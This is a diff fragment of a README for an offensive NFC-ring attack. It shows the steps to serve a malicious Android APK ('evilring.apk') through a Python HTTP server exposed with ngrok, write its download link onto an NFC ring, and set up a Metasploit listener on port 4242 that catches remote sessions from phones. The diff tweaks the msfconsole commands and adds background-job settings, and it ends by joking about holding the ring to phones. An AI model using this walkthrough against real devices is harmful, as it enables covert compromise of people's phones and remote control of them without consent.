@@ -40,14 +40,14 @@ Replace the stars with your specific ngrok address and port number. 4242 will be
   
 `python3 -m http.server 8080`
 
-`./ngrok http 8080`
+`ngrok http 8080`
 
 5. Copy your direct download link to your NFC ring (http://***.***/evilring.apk)
 This can be done with the proxmark3, chameleon tiny, or even just an NFC enabled device using the NFC Tools app.
 
 6. On your command and control open msfconsole:
   
-`msfconsole -q`
+`msfconsole`
 
 (inside msfconsole)
 
@@ -59,6 +59,8 @@ This can be done with the proxmark3, chameleon tiny, or even just an NFC enabled
 
 `set LPORT 4242`
 
-`run`
+`set ExitOnSession false'
+
+'exploit -j'
   
 7.  (Dont) go an hold onto some phones!
